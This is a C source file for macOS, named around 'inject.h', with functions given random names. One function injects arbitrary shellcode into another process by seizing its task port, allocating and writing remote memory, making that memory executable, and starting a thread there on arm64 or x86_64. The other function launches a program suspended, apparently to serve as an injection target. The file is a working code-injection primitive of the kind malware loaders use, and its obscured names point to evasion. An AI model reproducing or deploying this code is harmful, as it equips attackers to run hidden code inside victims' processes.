#include "inject.h"
#include <stdio.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <mach/mach_traps.h>
#include <pthread.h>
#include <spawn.h>

extern char **environ;

int vqxbtnmr(pid_t pid, const unsigned char *shellcode, size_t len) {
    mach_port_t task;

    if (task_for_pid(mach_task_self(), pid, &task) != KERN_SUCCESS)
        return -1;

    mach_vm_address_t remote_addr = 0;
    if (mach_vm_allocate(task, &remote_addr, len,
                         VM_FLAGS_ANYWHERE) != KERN_SUCCESS) {
        mach_port_deallocate(mach_task_self(), task);
        return -2;
    }

    if (mach_vm_write(task, remote_addr,
                      (vm_offset_t)shellcode,
                      (mach_msg_type_number_t)len) != KERN_SUCCESS) {
        mach_vm_deallocate(task, remote_addr, len);
        mach_port_deallocate(mach_task_self(), task);
        return -3;
    }

    if (mach_vm_protect(task, remote_addr, len, 0,
                        VM_PROT_READ | VM_PROT_EXECUTE) != KERN_SUCCESS) {
        mach_vm_deallocate(task, remote_addr, len);
        mach_port_deallocate(mach_task_self(), task);
        return -4;
    }

#if defined(__arm64__) || defined(__aarch64__)
    arm_thread_state64_t state;
    memset(&state, 0, sizeof(state));
    arm_thread_state64_set_pc_fptr(state, (void *)remote_addr);
    thread_state_flavor_t flavor = ARM_THREAD_STATE64;
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
#else
    x86_thread_state64_t state;
    memset(&state, 0, sizeof(state));
    state.__rip = (uint64_t)remote_addr;
    thread_state_flavor_t flavor = x86_THREAD_STATE64;
    mach_msg_type_number_t count = x86_THREAD_STATE64_COUNT;
#endif

    thread_act_t thread;
    if (thread_create_running(task, flavor,
                              (thread_state_t)&state, count,
                              &thread) != KERN_SUCCESS) {
        mach_vm_deallocate(task, remote_addr, len);
        mach_port_deallocate(mach_task_self(), task);
        return -5;
    }

    mach_port_deallocate(mach_task_self(), thread);
    mach_port_deallocate(mach_task_self(), task);
    return 0;
}

pid_t bxqnvtmr(const char *path) {
    char *argv[] = { (char *)path, NULL };
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    posix_spawnattr_setflags(&attr, POSIX_SPAWN_START_SUSPENDED);
    pid_t pid;
    int rc = posix_spawn(&pid, path, NULL, &attr, argv, environ);
    posix_spawnattr_destroy(&attr);
    return rc == 0 ? pid : -1;
}
